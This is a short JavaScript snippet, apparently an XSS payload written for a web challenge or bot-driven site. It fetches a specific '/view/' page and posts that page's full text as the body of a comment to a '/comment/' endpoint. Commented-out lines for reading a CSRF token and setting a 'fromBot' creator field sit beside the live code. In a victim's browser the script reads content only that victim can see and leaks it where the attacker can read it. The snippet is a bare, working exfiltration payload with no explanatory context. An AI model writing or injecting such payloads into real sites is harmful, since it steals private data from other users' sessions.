//var csrf = document.getElementsByTagName("input")[0].value;
fetch("/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
	return res.text();
}).then(data => {
	var formData = new FormData();

	formData.append("csrfmiddlewaretoken", '');
	//formData.append("creator", "fromBot");
	formData.append("body", data);

	fetch("/comment/2b0fb296-f13b-489a-b533-0ca434654d45",{
		method: 'POST',
		body: formData
	});

})
